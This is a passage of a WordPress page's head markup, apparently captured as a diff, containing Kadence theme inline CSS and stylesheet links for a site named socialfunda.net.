+.header-navigation-dropdown-direction-left ul ul.submenu, .header-navigation-dropdown-direction-left ul ul.sub-menu{right:0px;left:auto;}.rtl .header-navigation-dropdown-direction-right ul ul.submenu, .rtl .header-navigation-dropdown-direction-right ul ul.sub-menu{left:0px;right:auto;}.header-account-button .nav-drop-title-wrap > .kadence-svg-iconset, .header-account-button > .kadence-svg-iconset{font-size:1.2em;}.site-header-item .header-account-button .nav-drop-title-wrap, .site-header-item .header-account-wrap > .header-account-button{display:flex;align-items:center;}.header-account-style-icon_label .header-account-label{padding-left:5px;}.header-account-style-label_icon .header-account-label{padding-right:5px;}.site-header-item .header-account-wrap .header-account-button{text-decoration:none;box-shadow:none;color:inherit;background:transparent;padding:0.6em 0em 0.6em 0em;}.header-mobile-account-wrap .header-account-button .nav-drop-title-wrap > .kadence-svg-iconset, .header-mobile-account-wrap .header-account-button > .kadence-svg-iconset{font-size:1.2em;}.header-mobile-account-wrap .header-account-button .nav-drop-title-wrap, .header-mobile-account-wrap > .header-account-button{display:flex;align-items:center;}.header-mobile-account-wrap.header-account-style-icon_label .header-account-label{padding-left:5px;}.header-mobile-account-wrap.header-account-style-label_icon .header-account-label{padding-right:5px;}.header-mobile-account-wrap .header-account-button{text-decoration:none;box-shadow:none;color:inherit;background:transparent;padding:0.6em 0em 0.6em 0em;}#login-drawer .drawer-inner .drawer-content{display:flex;justify-content:center;align-items:center;position:absolute;top:0px;bottom:0px;left:0px;right:0px;padding:0px;}#loginform p label{display:block;}#login-drawer #loginform{width:100%;}#login-drawer #loginform input{width:100%;}#login-drawer #loginform input[type="checkbox"]{width:auto;}#login-drawer .drawer-inner .drawer-header{position:relative;z-index:100;}#login-drawer .drawer-content_inner.widget_login_form_inner{padding:2em;width:100%;max-width:350px;border-radius:.25rem;background:var(--global-palette9);color:var(--global-palette4);}#login-drawer .lost_password a{color:var(--global-palette6);}#login-drawer .lost_password, #login-drawer .register-field{text-align:center;}#login-drawer .widget_login_form_inner p{margin-top:1.2em;margin-bottom:0em;}#login-drawer .widget_login_form_inner p:first-child{margin-top:0em;}#login-drawer .widget_login_form_inner label{margin-bottom:0.5em;}#login-drawer hr.register-divider{margin:1.2em 0;border-width:1px;}#login-drawer .register-field{font-size:90%;}@media all and (min-width: 1025px){#login-drawer hr.register-divider.hide-desktop{display:none;}#login-drawer p.register-field.hide-desktop{display:none;}}@media all and (max-width: 1024px){#login-drawer hr.register-divider.hide-mobile{display:none;}#login-drawer p.register-field.hide-mobile{display:none;}}@media all and (max-width: 767px){#login-drawer hr.register-divider.hide-mobile{display:none;}#login-drawer p.register-field.hide-mobile{display:none;}}.tertiary-navigation .tertiary-menu-container > ul > li.menu-item > a{padding-left:calc(1.2em / 2);padding-right:calc(1.2em / 2);padding-top:0.6em;padding-bottom:0.6em;color:var(--global-palette5);}.tertiary-navigation .tertiary-menu-container > ul > li.menu-item > a:hover{color:var(--global-palette-highlight);}.tertiary-navigation .tertiary-menu-container > ul > li.menu-item.current-menu-item > a{color:var(--global-palette3);}.header-navigation[class*="header-navigation-style-underline"] .header-menu-container.tertiary-menu-container>ul>li>a:after{width:calc( 100% - 1.2em);}.quaternary-navigation .quaternary-menu-container > ul > li.menu-item > a{padding-left:calc(1.2em / 2);padding-right:calc(1.2em / 2);padding-top:0.6em;padding-bottom:0.6em;color:var(--global-palette5);}.quaternary-navigation .quaternary-menu-container > ul > li.menu-item > a:hover{color:var(--global-palette-highlight);}.quaternary-navigation .quaternary-menu-container > ul > li.menu-item.current-menu-item > a{color:var(--global-palette3);}.header-navigation[class*="header-navigation-style-underline"] .header-menu-container.quaternary-menu-container>ul>li>a:after{width:calc( 100% - 1.2em);}#main-header .header-divider{border-right:17px solid #0e68ed;height:38%;}#main-header .header-divider2{border-right:1px solid var(--global-palette6);height:50%;}#main-header .header-divider3{border-right:1px solid var(--global-palette6);height:50%;}#mobile-header .header-mobile-divider, #mobile-drawer .header-mobile-divider{border-right:1px solid var(--global-palette6);height:50%;}#mobile-drawer .header-mobile-divider{border-top:1px solid var(--global-palette6);width:50%;}#mobile-header .header-mobile-divider2{border-right:1px solid var(--global-palette6);height:50%;}#mobile-drawer .header-mobile-divider2{border-top:1px solid var(--global-palette6);width:50%;}.header-item-search-bar form ::-webkit-input-placeholder{color:currentColor;opacity:0.5;}.header-item-search-bar form ::placeholder{color:currentColor;opacity:0.5;}.header-search-bar form{max-width:100%;width:240px;}.header-mobile-search-bar form{max-width:calc(100vw - var(--global-sm-spacing) - var(--global-sm-spacing));width:240px;}.header-widget-lstyle-normal .header-widget-area-inner a:not(.button){text-decoration:underline;}.element-contact-inner-wrap{display:flex;flex-wrap:wrap;align-items:center;margin-top:-0.6em;margin-left:calc(-0.6em / 2);margin-right:calc(-0.6em / 2);}.element-contact-inner-wrap .header-contact-item{display:inline-flex;flex-wrap:wrap;align-items:center;margin-top:0.6em;margin-left:calc(0.6em / 2);margin-right:calc(0.6em / 2);}.element-contact-inner-wrap .header-contact-item .kadence-svg-iconset{font-size:1em;}.header-contact-item img{display:inline-block;}.header-contact-item .contact-label{margin-left:0.3em;}.rtl .header-contact-item .contact-label{margin-right:0.3em;margin-left:0px;}.header-mobile-contact-wrap .element-contact-inner-wrap{display:flex;flex-wrap:wrap;align-items:center;margin-top:-0.6em;margin-left:calc(-0.6em / 2);margin-right:calc(-0.6em / 2);}.header-mobile-contact-wrap .element-contact-inner-wrap .header-contact-item{display:inline-flex;flex-wrap:wrap;align-items:center;margin-top:0.6em;margin-left:calc(0.6em / 2);margin-right:calc(0.6em / 2);}.header-mobile-contact-wrap .element-contact-inner-wrap .header-contact-item .kadence-svg-iconset{font-size:1em;}#main-header .header-button2{box-shadow:0px 0px 0px -7px rgba(0,0,0,0);}#main-header .header-button2:hover{box-shadow:0px 15px 25px -7px rgba(0,0,0,0.1);}.mobile-header-button2-wrap .mobile-header-button-inner-wrap .mobile-header-button2{border:2px none transparent;box-shadow:0px 0px 0px -7px rgba(0,0,0,0);}.mobile-header-button2-wrap .mobile-header-button-inner-wrap .mobile-header-button2:hover{box-shadow:0px 15px 25px -7px rgba(0,0,0,0.1);}#widget-drawer.popup-drawer-layout-fullwidth .drawer-content .header-widget2, #widget-drawer.popup-drawer-layout-sidepanel .drawer-inner{max-width:400px;}#widget-drawer.popup-drawer-layout-fullwidth .drawer-content .header-widget2{margin:0 auto;}.widget-toggle-open{display:flex;align-items:center;background:transparent;box-shadow:none;}.widget-toggle-open:hover, .widget-toggle-open:focus{border-color:currentColor;background:transparent;box-shadow:none;}.widget-toggle-open .widget-toggle-icon{display:flex;}.widget-toggle-open .widget-toggle-label{padding-right:5px;}.rtl .widget-toggle-open .widget-toggle-label{padding-left:5px;padding-right:0px;}.widget-toggle-open .widget-toggle-label:empty, .rtl .widget-toggle-open .widget-toggle-label:empty{padding-right:0px;padding-left:0px;}.widget-toggle-open-container .widget-toggle-open{color:var(--global-palette5);padding:0.4em 0.6em 0.4em 0.6em;font-size:14px;}.widget-toggle-open-container .widget-toggle-open.widget-toggle-style-bordered{border:1px solid currentColor;}.widget-toggle-open-container .widget-toggle-open .widget-toggle-icon{font-size:20px;}.widget-toggle-open-container .widget-toggle-open:hover, .widget-toggle-open-container .widget-toggle-open:focus{color:var(--global-palette-highlight);}#widget-drawer .header-widget-2style-normal a:not(.button){text-decoration:underline;}#widget-drawer .header-widget-2style-plain a:not(.button){text-decoration:none;}#widget-drawer .header-widget2 .widget-title{color:var(--global-palette9);}#widget-drawer .header-widget2{color:var(--global-palette8);}#widget-drawer .header-widget2 a:not(.button), #widget-drawer .header-widget2 .drawer-sub-toggle{color:var(--global-palette8);}#widget-drawer .header-widget2 a:not(.button):hover, #widget-drawer .header-widget2 .drawer-sub-toggle:hover{color:var(--global-palette9);}#mobile-secondary-site-navigation ul li{font-size:14px;}#mobile-secondary-site-navigation ul li a{padding-top:1em;padding-bottom:1em;}#mobile-secondary-site-navigation ul li > a, #mobile-secondary-site-navigation ul li.menu-item-has-children > .drawer-nav-drop-wrap{color:var(--global-palette8);}#mobile-secondary-site-navigation ul li.current-menu-item > a, #mobile-secondary-site-navigation ul li.current-menu-item.menu-item-has-children > .drawer-nav-drop-wrap{color:var(--global-palette-highlight);}#mobile-secondary-site-navigation ul li.menu-item-has-children .drawer-nav-drop-wrap, #mobile-secondary-site-navigation ul li:not(.menu-item-has-children) a{border-bottom:1px solid rgba(255,255,255,0.1);}#mobile-secondary-site-navigation:not(.drawer-navigation-parent-toggle-true) ul li.menu-item-has-children .drawer-nav-drop-wrap button{border-left:1px solid rgba(255,255,255,0.1);}
+/*# sourceURL=kadence-global-inline-css */
+</style>
+<link rel='stylesheet' id='kadence-header-css' href='https://socialfunda.net/wp-content/themes/kadence/assets/css/header.min.css?ver=9.1.50' media='all' />
+<link rel='stylesheet' id='kadence-content-css' href='https://socialfunda.net/wp-content/themes/kadence/assets/css/content.min.css?ver=9.1.50' media='all' />
+<link rel='stylesheet' id='kadence-comments-css' href='https://socialfunda.net/wp-content/themes/kadence/assets/css/comments.min.css?ver=9.1.50' media='all' />
+<link rel='stylesheet' id='kadence-sidebar-css' href='https://socialfunda.net/wp-content/themes/kadence/assets/css/sidebar.min.css?ver=9.1.50' media='all' />
+<link rel='stylesheet' id='kadence-related-posts-css' href='https://socialfunda.net/wp-content/themes/kadence/assets/css/related-posts.min.css?ver=9.1.50' media='all' />
+<link rel='stylesheet' id='kad-splide-css' href='https://socialfunda.net/wp-content/themes/kadence/assets/css/kadence-splide.min.css?ver=9.1.50' media='all' />
+<link rel='stylesheet' id='kadence-footer-css' href='https://socialfunda.net/wp-content/themes/kadence/assets/css/footer.min.css?ver=9.1.50' media='all' />
+<link rel='stylesheet' id='menu-addons-css' href='https://socialfunda.net/wp-content/plugins/kadence-pro/dist/mega-menu/menu-addon.css?ver=1.1.19' media='all' />
+<link rel='stylesheet' id='kadence-blocks-rowlayout-css' href='https://socialfunda.net/wp-content/plugins/kadence-blocks/dist/style-blocks-rowlayout.css?ver=3.6.5' media='all' />
+<link rel='stylesheet' id='kadence-blocks-column-css' href='https://socialfunda.net/wp-content/plugins/kadence-blocks/dist/style-blocks-column.css?ver=3.6.5' media='all' />
+<style id='kadence-blocks-advancedheading-inline-css'>
+	.wp-block-kadence-advancedheading mark{background:transparent;border-style:solid;border-width:0}
+	.wp-block-kadence-advancedheading mark.kt-highlight{color:#f76a0c;}
+	.kb-adv-heading-icon{display: inline-flex;justify-content: center;align-items: center;}
+	.is-layout-constrained > .kb-advanced-heading-link {display: block;}.wp-block-kadence-advancedheading.has-background{padding: 0;}	.single-content .kadence-advanced-heading-wrapper h1,
+	.single-content .kadence-advanced-heading-wrapper h2,
+	.single-content .kadence-advanced-heading-wrapper h3,
+	.single-content .kadence-advanced-heading-wrapper h4,
+	.single-content .kadence-advanced-heading-wrapper h5,
+	.single-content .kadence-advanced-heading-wrapper h6 {margin: 1.5em 0 .5em;}
+	.single-content .kadence-advanced-heading-wrapper+* { margin-top:0;}.kb-screen-reader-text{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);}
+/*# sourceURL=kadence-blocks-advancedheading-inline-css */
+</style>
+<link rel='stylesheet' id='kadence-blocks-iconlist-css' href='https://socialfunda.net/wp-content/plugins/kadence-blocks/dist/style-blocks-iconlist.css?ver=3.6.5' media='all' />
+<link rel='stylesheet' id='kadence-blocks-image-css' href='https://socialfunda.net/wp-content/plugins/kadence-blocks/dist/style-blocks-image.css?ver=3.6.5' media='all' />
+<link rel='stylesheet' id='kadence-blocks-accordion-css' href='https://socialfunda.net/wp-content/plugins/kadence-blocks/dist/style-blocks-accordion.css?ver=3.6.5' media='all' />
+<style id='wp-block-paragraph-inline-css'>
+.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}:root :where(p.has-background){padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
+/*# sourceURL=https://socialfunda.net/wp-includes/blocks/paragraph/style.min.css */
+</style>
+<link rel='stylesheet' id='kadence-rankmath-css' href='https://socialfunda.net/wp-content/themes/kadence/assets/css/rankmath.min.css?ver=1.1.50' media='all' />
+<style id='kadence-blocks-global-variables-inline-css'>
+:root {--global-kb-font-size-sm:clamp(0.8rem, 0.73rem + 0.217vw, 0.9rem);--global-kb-font-size-md:clamp(1.1rem, 0.995rem + 0.326vw, 1.25rem);--global-kb-font-size-lg:clamp(1.75rem, 1.576rem + 0.543vw, 2rem);--global-kb-font-size-xl:clamp(2.25rem, 1.728rem + 1.63vw, 3rem);--global-kb-font-size-xxl:clamp(2.5rem, 1.456rem + 3.26vw, 4rem);--global-kb-font-size-xxxl:clamp(2.75rem, 0.489rem + 7.065vw, 6rem);}
+/*# sourceURL=kadence-blocks-global-variables-inline-css */
+</style>
+<style id='kadence_blocks_css-inline-css'>
+.wp-block-kadence-column.kb-section-dir-horizontal > .kt-inside-inner-col > .kt-info-box4238_42fa17-79 .kt-blocks-info-box-link-wrap{max-width:unset;}.kt-info-box4238_42fa17-79 .kt-blocks-info-box-link-wrap{border-top:5px solid var(--global-palette7, #eeeeee);border-right:5px solid var(--global-palette7, #eeeeee);border-bottom:5px solid var(--global-palette7, #eeeeee);border-left:5px solid var(--global-palette7, #eeeeee);border-top-left-radius:20px;border-top-right-radius:20px;border-bottom-right-radius:20px;border-bottom-left-radius:20px;background:#ffffff;padding-top:var(--global-kb-spacing-sm, 1.5rem);padding-right:var(--global-kb-spacing-sm, 1.5rem);padding-bottom:var(--global-kb-spacing-sm, 1.5rem);padding-left:var(--global-kb-spacing-sm, 1.5rem);margin-top:100px;}.kt-info-box4238_42fa17-79.wp-block-kadence-infobox{max-width:100%;}.kt-info-box4238_42fa17-79 .kadence-info-box-image-inner-intrisic-container{max-width:100px;}.kt-info-box4238_42fa17-79 .kadence-info-box-image-inner-intrisic-container .kadence-info-box-image-intrisic{padding-bottom:66.6797%;width:2560px;height:0px;max-width:100%;}.kt-info-box4238_42fa17-79 .kadence-info-box-icon-container .kt-info-svg-icon, .kt-info-box4238_42fa17-79 .kt-info-svg-icon-flip, .kt-info-box4238_42fa17-79 .kt-blocks-info-box-number{font-size:50px;}.kt-info-box4238_42fa17-79 .kt-blocks-info-box-media{background:#ffffff;border-color:var(--global-palette7, #eeeeee);border-radius:200px;overflow:hidden;border-top-width:5px;border-right-width:5px;border-bottom-width:5px;border-left-width:5px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;}.kt-info-box4238_42fa17-79 .kt-blocks-info-box-media-container{margin-top:-75px;margin-right:0px;margin-bottom:20px;margin-left:0px;}.kt-info-box4238_42fa17-79 .kt-infobox-textcontent h2.kt-blocks-info-box-title{padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:5px;margin-right:0px;margin-bottom:10px;margin-left:0px;}@media all and (max-width: 1024px){.kt-info-box4238_42fa17-79 .kt-blocks-info-box-link-wrap{border-top:5px solid var(--global-palette7, #eeeeee);border-right:5px solid var(--global-palette7, #eeeeee);border-bottom:5px solid var(--global-palette7, #eeeeee);border-left:5px solid var(--global-palette7, #eeeeee);}}@media all and (max-width: 767px){.kt-info-box4238_42fa17-79 .kt-blocks-info-box-link-wrap{border-top:5px solid var(--global-palette7, #eeeeee);border-right:5px solid var(--global-palette7, #eeeeee);border-bottom:5px solid var(--global-palette7, #eeeeee);border-left:5px solid var(--global-palette7, #eeeeee);}}.wp-block-kadence-column.kb-section-dir-horizontal > .kt-inside-inner-col > .kt-info-box762_e5e5e0-f0 .kt-blocks-info-box-link-wrap{max-width:unset;}.kt-info-box762_e5e5e0-f0 .kt-blocks-info-box-link-wrap{border-top:5px solid var(--global-palette7, #eeeeee);border-right:5px solid var(--global-palette7, #eeeeee);border-bottom:5px solid var(--global-palette7, #eeeeee);border-left:5px solid var(--global-palette7, #eeeeee);border-top-left-radius:20px;border-top-right-radius:20px;border-bottom-right-radius:20px;border-bottom-left-radius:20px;background:#ffffff;padding-top:var(--global-kb-spacing-sm, 1.5rem);padding-right:var(--global-kb-spacing-sm, 1.5rem);padding-bottom:var(--global-kb-spacing-sm, 1.5rem);padding-left:var(--global-kb-spacing-sm, 1.5rem);margin-top:50px;}.kt-info-box762_e5e5e0-f0.wp-block-kadence-infobox{max-width:100%;}.kt-info-box762_e5e5e0-f0 .kadence-info-box-image-inner-intrisic-container{max-width:100px;}.kt-info-box762_e5e5e0-f0 .kadence-info-box-image-inner-intrisic-container .kadence-info-box-image-intrisic{padding-bottom:66.6797%;width:2560px;height:0px;max-width:100%;}.kt-info-box762_e5e5e0-f0 .kadence-info-box-icon-container .kt-info-svg-icon, .kt-info-box762_e5e5e0-f0 .kt-info-svg-icon-flip, .kt-info-box762_e5e5e0-f0 .kt-blocks-info-box-number{font-size:50px;}.kt-info-box762_e5e5e0-f0 .kt-blocks-info-box-media{background:#ffffff;border-color:var(--global-palette7, #eeeeee);border-radius:200px;overflow:hidden;border-top-width:5px;border-right-width:5px;border-bottom-width:5px;border-left-width:5px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;}.kt-info-box762_e5e5e0-f0 .kt-blocks-info-box-media-container{margin-top:-75px;margin-right:0px;margin-bottom:20px;margin-left:0px;}.kt-info-box762_e5e5e0-f0 .kt-infobox-textcontent h2.kt-blocks-info-box-title{padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:5px;margin-right:0px;margin-bottom:10px;margin-left:0px;}@media all and (max-width: 1024px){.kt-info-box762_e5e5e0-f0 .kt-blocks-info-box-link-wrap{border-top:5px solid var(--global-palette7, #eeeeee);border-right:5px solid var(--global-palette7, #eeeeee);border-bottom:5px solid var(--global-palette7, #eeeeee);border-left:5px solid var(--global-palette7, #eeeeee);}}@media all and (max-width: 767px){.kt-info-box762_e5e5e0-f0 .kt-blocks-info-box-link-wrap{border-top:5px solid var(--global-palette7, #eeeeee);border-right:5px solid var(--global-palette7, #eeeeee);border-bottom:5px solid var(--global-palette7, #eeeeee);border-left:5px solid var(--global-palette7, #eeeeee);}}.kb-row-layout-id76_db69f0-17 > .kt-row-column-wrap{padding-top:var( --global-kb-row-default-top, var(--global-kb-spacing-sm, 1.5rem) );padding-bottom:var( --global-kb-row-default-bottom, var(--global-kb-spacing-sm, 1.5rem) );grid-template-columns:minmax(0, 1fr);}.kb-row-layout-id76_db69f0-17{border-top-left-radius:0px;border-bottom-right-radius:0px;}.kb-row-layout-id76_db69f0-17{background-color:rgba(33,83,135,0);}.kb-row-layout-id76_db69f0-17 .kt-row-layout-bottom-sep{height:88px;}.kb-row-layout-id76_db69f0-17 .kt-row-layout-bottom-sep svg{width:266%;}.kb-row-layout-id76_db69f0-17 .kt-row-layout-bottom-sep svg{fill:var(--global-palette2, #2B6CB0)!important;}@media all and (max-width: 767px){.kb-row-layout-id76_db69f0-17 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_ccee7d-12 > .kt-inside-inner-col{padding-right:10px;padding-left:10px;}.kadence-column76_ccee7d-12 > .kt-inside-inner-col{border-top:6px double #fffefe;border-right:6px double #fffefe;border-bottom:6px double #fffefe;border-left:6px double #fffefe;}.kadence-column76_ccee7d-12 > .kt-inside-inner-col,.kadence-column76_ccee7d-12 > .kt-inside-inner-col:before{border-top-left-radius:20px;border-top-right-radius:0px;border-bottom-right-radius:20px;border-bottom-left-radius:0px;}.kadence-column76_ccee7d-12 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_ccee7d-12 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_ccee7d-12 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_ccee7d-12 > .kt-inside-inner-col{background-color:var(--global-palette2, #2B6CB0);}@media all and (max-width: 1024px){.kadence-column76_ccee7d-12 > .kt-inside-inner-col{border-top:6px double #fffefe;border-right:6px double #fffefe;border-bottom:6px double #fffefe;border-left:6px double #fffefe;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_ccee7d-12 > .kt-inside-inner-col{padding-right:10px;padding-left:10px;border-top:6px double #fffefe;border-right:6px double #fffefe;border-bottom:6px double #fffefe;border-left:6px double #fffefe;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_027392-ef, .wp-block-kadence-advancedheading.kt-adv-heading76_027392-ef[data-kb-block="kb-adv-heading76_027392-ef"]{text-align:center;font-size:30px;color:#fffcfc;}.wp-block-kadence-advancedheading.kt-adv-heading76_027392-ef mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_027392-ef[data-kb-block="kb-adv-heading76_027392-ef"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_027392-ef img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_027392-ef[data-kb-block="kb-adv-heading76_027392-ef"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_027392-ef, .wp-block-kadence-advancedheading.kt-adv-heading76_027392-ef[data-kb-block="kb-adv-heading76_027392-ef"]{font-size:18px;}}.wp-block-kadence-advancedheading.kt-adv-heading76_05f080-b7 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_05f080-b7[data-kb-block="kb-adv-heading76_05f080-b7"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_05f080-b7 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_05f080-b7[data-kb-block="kb-adv-heading76_05f080-b7"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_05f080-b7, .wp-block-kadence-advancedheading.kt-adv-heading76_05f080-b7[data-kb-block="kb-adv-heading76_05f080-b7"]{padding-right:15px;padding-left:15px;}}.wp-block-kadence-advancedheading.kt-adv-heading76_f9e365-a5 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_f9e365-a5[data-kb-block="kb-adv-heading76_f9e365-a5"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_f9e365-a5 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_f9e365-a5[data-kb-block="kb-adv-heading76_f9e365-a5"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_f9e365-a5, .wp-block-kadence-advancedheading.kt-adv-heading76_f9e365-a5[data-kb-block="kb-adv-heading76_f9e365-a5"]{padding-right:15px;padding-left:15px;}}.kadence-column76_7a0f81-6b > .kt-inside-inner-col{padding-top:8px;padding-bottom:8px;}.kadence-column76_7a0f81-6b > .kt-inside-inner-col{box-shadow:inset 0px 0px 11px 1px rgba(0, 0, 0, 0.31);border-top:0px solid var(--global-palette2, #2B6CB0);border-right:6px solid var(--global-palette2, #2B6CB0);border-bottom:0px solid var(--global-palette2, #2B6CB0);border-left:6px solid #215387;}.kadence-column76_7a0f81-6b > .kt-inside-inner-col,.kadence-column76_7a0f81-6b > .kt-inside-inner-col:before{border-top-left-radius:0px;border-top-right-radius:45px;border-bottom-right-radius:0px;border-bottom-left-radius:45px;}.kadence-column76_7a0f81-6b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_7a0f81-6b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_7a0f81-6b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_7a0f81-6b > .kt-inside-inner-col{background-color:rgba(212, 212, 207, 0.32);}.kadence-column76_7a0f81-6b, .kt-inside-inner-col > .kadence-column76_7a0f81-6b:not(.specificity){margin-right:15px;margin-bottom:30px;margin-left:15px;}@media all and (max-width: 1024px){.kadence-column76_7a0f81-6b > .kt-inside-inner-col{border-top:0px solid var(--global-palette2, #2B6CB0);border-right:6px solid var(--global-palette2, #2B6CB0);border-bottom:0px solid var(--global-palette2, #2B6CB0);border-left:6px solid #215387;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_7a0f81-6b > .kt-inside-inner-col{border-top:0px solid var(--global-palette2, #2B6CB0);border-right:6px solid var(--global-palette2, #2B6CB0);border-bottom:0px solid var(--global-palette2, #2B6CB0);border-left:6px solid #215387;flex-direction:column;justify-content:center;}}.wp-block-kadence-iconlist.kt-svg-icon-list-items76_443ead-68:not(.this-stops-third-party-issues){margin-bottom:var(--global-kb-spacing-sm, 1.5rem);}.wp-block-kadence-iconlist.kt-svg-icon-list-items76_443ead-68 ul.kt-svg-icon-list:not(.this-prevents-issues):not(.this-stops-third-party-issues):not(.tijsloc){padding-left:10px;}.wp-block-kadence-iconlist.kt-svg-icon-list-items76_443ead-68 ul.kt-svg-icon-list{grid-row-gap:5px;}.wp-block-kadence-iconlist.kt-svg-icon-list-items76_443ead-68 .kb-svg-icon-wrap{color:var(--global-palette2, #2B6CB0);}.kt-svg-icon-list-item-76_fd4e73-12 .kt-svg-icon-list-text mark.kt-highlight{background-color:unset;color:#f76a0c;-webkit-box-decoration-break:clone;box-decoration-break:clone;}.kt-svg-icon-list-item-76_687e8d-c1 .kt-svg-icon-list-text mark.kt-highlight{background-color:unset;color:#f76a0c;-webkit-box-decoration-break:clone;box-decoration-break:clone;}.kt-svg-icon-list-item-76_56e7b9-dd .kt-svg-icon-list-text mark.kt-highlight{background-color:unset;color:#f76a0c;-webkit-box-decoration-break:clone;box-decoration-break:clone;}.kt-svg-icon-list-item-76_d232b2-99 .kt-svg-icon-list-text mark.kt-highlight{background-color:unset;color:#f76a0c;-webkit-box-decoration-break:clone;box-decoration-break:clone;}.kt-svg-icon-list-item-76_04eaef-77 .kt-svg-icon-list-text mark.kt-highlight{background-color:unset;color:#f76a0c;-webkit-box-decoration-break:clone;box-decoration-break:clone;}.kt-svg-icon-list-item-76_1ddb67-a0 .kt-svg-icon-list-text mark.kt-highlight{background-color:unset;color:#f76a0c;-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_afd086-27 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_afd086-27[data-kb-block="kb-adv-heading76_afd086-27"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_afd086-27 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_afd086-27[data-kb-block="kb-adv-heading76_afd086-27"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_afd086-27, .wp-block-kadence-advancedheading.kt-adv-heading76_afd086-27[data-kb-block="kb-adv-heading76_afd086-27"]{padding-right:15px;padding-left:15px;}}.wp-block-kadence-advancedheading.kt-adv-heading76_2ff193-04 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_2ff193-04[data-kb-block="kb-adv-heading76_2ff193-04"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_2ff193-04 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_2ff193-04[data-kb-block="kb-adv-heading76_2ff193-04"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_2ff193-04, .wp-block-kadence-advancedheading.kt-adv-heading76_2ff193-04[data-kb-block="kb-adv-heading76_2ff193-04"]{padding-right:15px;padding-left:15px;}}.kadence-column76_44a7ff-66 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_44a7ff-66 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_44a7ff-66 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_44a7ff-66 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_44a7ff-66 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_44a7ff-66, .kt-inside-inner-col > .kadence-column76_44a7ff-66:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_44a7ff-66 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_44a7ff-66 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_b581e3-4d, .wp-block-kadence-advancedheading.kt-adv-heading76_b581e3-4d[data-kb-block="kb-adv-heading76_b581e3-4d"]{text-align:center;color:#ffffff;}.wp-block-kadence-advancedheading.kt-adv-heading76_b581e3-4d mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_b581e3-4d[data-kb-block="kb-adv-heading76_b581e3-4d"] 